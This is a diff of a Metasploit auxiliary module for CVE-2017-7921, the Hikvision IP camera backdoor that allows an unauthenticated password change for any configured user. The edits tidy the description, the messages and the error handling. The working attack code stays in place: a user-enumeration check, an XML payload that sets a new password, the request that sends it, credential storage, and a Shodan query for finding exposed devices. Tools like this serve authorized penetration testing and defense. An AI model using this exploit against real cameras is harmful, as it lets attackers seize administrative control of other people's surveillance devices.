@@ -12,15 +12,18 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name' => 'Unauthenticated password change for any user configured at a vulnerable Hikvision IP Camera',
+        'Name' => 'Hikvision IP Camera Unauthenticated Password Change',
         'Description' => %q{
           Many Hikvision IP cameras contain a backdoor that allows unauthenticated impersonation of any configured user account.
-          The vulnerability has been present in Hikvision products since 2014.
-          In addition to Hikvision-branded devices, it affects many white-labeled camera products sold under a variety of brand names.
-          Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time of publishing (shodan search: "App-webs" "200 OK").
+          The vulnerability has been present in Hikvision products since 2014. In addition to Hikvision-branded devices, it
+          affects many white-labeled camera products sold under a variety of brand names.
 
-          This Module allows the attacker to perform an unauthenticated password change of any vulnerable Hikvision IP Camera to gaining full administrative access.
-          The vulnerability can be exploited for all configured users.
+          Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time
+          of publishing (shodan search: '"App-webs" "200 OK"'). Some of these devices can never be patched due to to the
+          vendor not building in mechanisms to allow the affected device to be upgraded to patched firmware.
+
+          This module allows the attacker to perform an unauthenticated password change of any user account on
+          a vulnerable Hikvision IP Camera. Attackers can use this to gain full administrative access to the affected device.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -32,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
           [ 'PACKETSTORM', '144097' ],
           [ 'URL', 'https://ipvm.com/reports/hik-exploit' ],
           [ 'URL', 'https://attackerkb.com/topics/PlLehGSmxT/cve-2017-7921' ],
-          [ 'URL', 'http://seclists.org/fulldisclosure/2017/Sep/23' ]
+          [ 'URL', 'https://seclists.org/fulldisclosure/2017/Sep/23' ]
         ],
         'DisclosureDate' => '2017-09-23',
         'Notes' => {
@@ -83,7 +86,7 @@ class MetasploitModule < Msf::Auxiliary
 
     cred_res = create_credential_login(login_data)
     unless cred_res.nil?
-      print_status("Credentials for user:#{datastore['USERNAME']} are added to the database...")
+      print_status("Credentials for #{datastore['USERNAME']} were added to the database...")
     end
   end
 
@@ -97,13 +100,12 @@ class MetasploitModule < Msf::Auxiliary
         }
       })
     rescue StandardError => e
-      print_error("#{peer} - Communication error occurred: #{e.message}")
       elog("#{peer} - Communication error occurred: #{e.message}", error: e)
-      return Exploit::CheckCode::Unknown
+      return Exploit::CheckCode::Unknown("#{peer} - Communication error occurred: #{e.message}")
     end
 
     if res.nil?
-      return Exploit::CheckCode::Unknown
+      return Exploit::CheckCode::UnexpectedReply('No response recieved from the target!')
     elsif res && res.code == 200
       xml_res = res.get_xml_document
       print_status('Following users are available for password reset...')
@@ -120,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
     return unless check == Exploit::CheckCode::Vulnerable
 
     begin
-      print_status("Starting the password reset for user:#{datastore['USERNAME']} and sending the payload...")
+      print_status("Starting the password reset for #{datastore['USERNAME']}...")
       post_data = %(<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\r\n<id>#{datastore['ID']}</id>\r\n<userName>#{datastore['USERNAME']}</userName>\r\n<password>#{datastore['PASSWORD']}</password>\r\n</User>)
 
       res = send_request_cgi({
@@ -138,16 +140,18 @@ class MetasploitModule < Msf::Auxiliary
       return nil
     end
 
-    if res.nil? || res.code != 200
-      print_error('Unknown Error. Password reset was not sucessfull!')
-      print_status("Please check the password rules and ensure that the user account/ID:#{datastore['USERNAME']}/#{datastore['ID']} exists!")
-      return
-    elsif res && res.code == 200
-      print_good("Password reset for user:#{datastore['USERNAME']} is successful completed !!!")
-      print_status("Please log in with your new password:#{datastore['PASSWORD']}")
+    if res.nil?
+      fail_with(Failure::Unknown, 'Target server did not respond to the password reset request')
+    elsif res.code == 200
+      print_good("Password reset for #{datastore['USERNAME']} was successfully completed!")
+      print_status("Please log in with your new password: #{datastore['PASSWORD']}")
       if datastore['STORE_CRED'] == true
         report_creds
       end
+    else
+      print_error('Unknown Error. Password reset was not successful!')
+      print_status("Please check the password rules and ensure that the user account/ID:#{datastore['USERNAME']}/#{datastore['ID']} exists!")
+      return
     end
   end
 end
